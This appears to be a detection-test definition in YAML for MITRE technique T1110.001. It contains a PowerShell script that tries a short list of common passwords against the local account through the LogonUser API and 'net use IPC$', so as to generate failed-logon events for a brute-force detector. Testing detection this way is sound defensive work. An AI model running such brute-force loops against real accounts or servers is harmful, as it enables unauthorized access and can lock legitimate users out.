id: T1110.001
name: Password Brute Force
description: Simulates brute force using the LogonUser Win32 API (generates EID 4625 with LogonType=2) and net use \\IPC$ (generates EID 4625 with LogonType=3 — network logon). The net use variant is the pattern Exabeam's brute force behavioral model detects. Uses wrong passwords against a test target — no account lockout risk with short password list.
tactic: credential-access
technique_id: T1110.001
platform: windows
phase: attack
elevation_required: false
expected_events:
  - "4625 (Failed logon - LogonType=2 via LogonUser API, SubStatus=0xC000006A wrong password)"
  - "4625 (Failed logon - LogonType=3 via net use IPC$, network logon attempt)"
  - "4740 (Account lockout — only if lockout policy triggers)"
  - "4688 (net.exe with use \\IPC$ arguments)"
tags:
  - credential-access
  - no-prereqs
executor:
  type: powershell
  command: |-
    Write-Host "[T1110.001] Password Brute Force — LogonUser API + net use IPC$ patterns"

    $targetUser = $env:USERNAME
    $wrongPasswords = @("Password1","Winter2024!","Summer2024!","Company123","Welcome1")

    # Method 1: LogonUser Win32 API — generates EID 4625 LogonType=2 (interactive)
    Write-Host "--- Method 1: LogonUser API brute force (EID 4625 LogonType=2) ---"
    $sig = '[DllImport("advapi32.dll",SetLastError=true)] public static extern bool LogonUser(string u,string d,string p,int t,int prov,out IntPtr h); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
    Add-Type -MemberDefinition $sig -Name BFAuth -Namespace LNJ02
    foreach ($pwd in $wrongPasswords) {
        $token = [IntPtr]::Zero
        $ok = [LNJ02.BFAuth]::LogonUser($targetUser, $env:COMPUTERNAME, $pwd, 2, 0, [ref]$token)
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($ok) {
            Write-Host "  SUCCESS: $targetUser / $pwd"
            [LNJ02.BFAuth]::CloseHandle($token) | Out-Null
        } else {
            $msg = ([System.ComponentModel.Win32Exception]$err).Message
            Write-Host "  FAIL: $targetUser / $pwd ($msg)"
        }
        Start-Sleep -Milliseconds 500
    }

    # Method 2: net use \\IPC$ — generates EID 4625 LogonType=3 (network logon)
    # This is the pattern Exabeam's brute force behavioral model detects
    Write-Host "--- Method 2: net use IPC$ brute force (EID 4625 LogonType=3 — network logon) ---"
    $server = "\\$env:COMPUTERNAME\IPC$"
    foreach ($pwd in $wrongPasswords) {
        net use $server /user:"$env:COMPUTERNAME\$targetUser" $pwd 2>&1 | Out-Null
        net use $server /delete 2>&1 | Out-Null
        Write-Host "  net use attempt: $targetUser / $pwd"
        Start-Sleep -Milliseconds 300
    }

    Write-Host "[T1110.001] Complete. EID 4625 burst with LogonType 2 and 3. SubStatus=0xC000006A (wrong password)."
cleanup: ""
